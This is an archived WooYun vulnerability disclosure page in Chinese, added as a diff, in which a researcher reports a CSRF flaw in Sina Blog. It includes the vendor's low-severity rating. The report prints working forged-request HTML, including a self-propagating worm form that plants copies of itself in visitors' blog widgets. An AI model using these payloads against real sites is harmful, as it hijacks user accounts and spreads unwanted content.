@@ -1,0 +1,242 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		新浪另类CSRF蠕虫放大危害  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		新浪另类CSRF蠕虫放大危害  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/LaiX">LaiX</a> 
+</li><li>提交时间：		2013-09-02 22:49</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-09-02：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-09-03：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-09-13：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-09-23：	细节向普通白帽子公开<br/>
+									2013-10-03：	细节向实习白帽子公开<br/>
+									2013-10-17：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">当CSRF遇到一个小伙伴时，会发生什么？</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">一个&lt;from&gt;标签引发的血案。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">我们知道新浪博客有一个转载功能：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/02184944f53d59410a516b1d8fb3b75aac6a2f40.png" target="_blank"><img src="../images/02184944f53d59410a516b1d8fb3b75aac6a2f40.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+我们来试试其中一个，轻博客。<br />
+<br />
+<br />
+<br />
+构造如下HTML发布到博客首页的自定义组件里。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/021930574f525e998bcccc0cb362c71ec111a9a4.png" target="_blank"><img src="../images/021930574f525e998bcccc0cb362c71ec111a9a4.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;form name=&quot;IjaxForm&quot; action=&quot;http://control.blog.sina.com.cn/blog_rebuild/riaapi/blog/share2qing.php?domain=1&quot; method=&quot;post&quot; target=&quot;loadingIframe_thread3561&quot;&gt;<br />
+&lt;input type=&quot;hidden&quot; name=&quot;version&quot; value=&quot;7&quot;&gt;<br />
+&lt;input type=&quot;hidden&quot; name=&quot;blogId&quot; value=&quot;d31df6a10101qlbl&quot;&gt;<br />
+&lt;input type=&quot;hidden&quot; name=&quot;rnd&quot; value=&quot;1378116659115&quot;&gt;<br />
+&lt;input type=&quot;submit&quot; value=&quot;你敢不敢点我&quot;&gt;<br />
+&lt;/form&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+其中blogId是文章的ID参数<br />
+<br />
+rnd参数 可以无视<br />
+<br />
+基本上绕过了CSRF防御<br />
+<br />
+<br />
+<br />
+准备好欺骗的文章，然后添加进自定义组件。当用户点击按钮时就可以转载我们的文章到轻博客，当然了只是转载文章，要让看见的用户再次感染,还得通过文章内容来欺骗访问再点击，岂不是很麻烦，这样感染力度就大大减少。<br />
+<br />
+<br />
+<br />
+那我们换个思路，我们知道新浪的CSRF只防御了外来域..而对本地域名是无视的，通过这个特点我们可以轻易的构造一个蠕虫攻击。<br />
+<br />
+<br />
+<br />
+那么如果我们构造的是发布自定义组件的CSRF会怎么样。<br />
+<br />
+<br />
+<br />
+通过抓包我发现了添加自定义组件的POST地址<br />
+<br />
+</p><pre><code>http://control.blog.sina.com.cn/riaapi/sys_module/edit_custmod_html_post.php?version=7&amp;amp;domain=1</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+我们构造如下payload:<br />
+<br />
+</p><pre><code>&lt;form id=&quot;IjaxForm2&quot; action=&quot;http://control.blog.sina.com.cn/riaapi/sys_module/edit_custmod_html_post.php?version=7&amp;amp;domain=1&quot; method=&quot;post&quot; target=&quot;loadingIframe_thread1554&quot;&gt;<br />
+&lt;input type=&quot;hidden&quot; name=&quot;Data&quot; value=&quot;&lt;form id=&#039;IjaxForm2&#039; action=&#039;http://control.blog.sina.com.cn/riaapi/sys_module/edit_custmod_html_post.php?version=7&amp;amp;domain=1&#039; method=&#039;post&#039; target=&#039;loadingIframe_thread1554&#039;&gt;&lt;input type=&#039;hidden&#039; name=&#039;Data&#039; value=&#039;Hello Sina&#039;&gt;&lt;input type=&#039;hidden&#039; name=&#039;Title&#039; value=&#039;敢不敢点我&#039;&gt;&lt;input type=&#039;hidden&#039; name=&#039;cid&#039; value=&#039;1006&#039;&gt;&lt;input type=&#039;submit&#039; value=&#039;敢不敢点我&#039;&gt;&lt;/form&gt;&quot;&gt;<br />
+&lt;input type=&quot;hidden&quot; name=&quot;Title&quot; value=&quot;敢不敢点我&quot;&gt;<br />
+&lt;input type=&quot;hidden&quot; name=&quot;cid&quot; value=&quot;1006&quot;&gt;<br />
+&lt;input type=&quot;submit&quot; value=&quot;敢不敢点我&quot;&gt;<br />
+&lt;/form&gt;</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/021920360d5589630d36f4f63fd2109408b8f530.png" target="_blank"><img src="../images/021920360d5589630d36f4f63fd2109408b8f530.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+由于逻辑有问题，这个代码至少也可以感染两层用户了..<br />
+<br />
+<br />
+<br />
+当用户点击按钮时，一些不为人知的事情正在发生着...<br />
+<br />
+<br />
+<br />
+难道仅仅是这样而已吗... 还有很多的POST我们都可以进行CSRF，这里就不再演示了。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">阿木哥，礼物你懂的... </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/LaiX" title="LaiX">LaiX</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-035940" title="新浪另类CSRF蠕虫放大危害">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：3 </p>
+													<p class="detail">确认时间：2013-09-03 16:40</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢关注新浪安全，根据该漏洞的实际影响综合考虑给3rank</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="35940";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
